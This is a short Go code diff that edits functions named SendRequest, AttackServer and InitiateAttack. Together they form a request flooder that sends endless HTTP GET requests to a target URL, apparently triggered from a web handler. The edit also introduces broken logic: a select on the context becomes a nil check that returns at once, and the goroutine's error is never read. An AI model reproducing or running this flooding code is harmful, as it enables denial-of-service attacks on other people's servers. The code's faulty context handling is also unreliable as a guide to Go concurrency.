@@ -13,23 +13,22 @@ var (
 	cancel context.CancelFunc
 )
 func SendRequest(url string) error {
-	for true {
+	for {
 		_, err := http.Get(url)
 		if err != nil {
 			return err
 		}
 	}
-	return nil
 }
 func AttackServer(ctx context.Context, url string) error {
 	c := make(chan error, 1)
 	go func() {
 		c <- SendRequest(url)
 	} ()
-	select {
-	case <- ctx.Done():
+	if(ctx.Done() != nil){
 		return ctx.Err()
 	}
+	return nil
 }
 
 func InitiateAttack(w http.ResponseWriter, r *http.Request) {
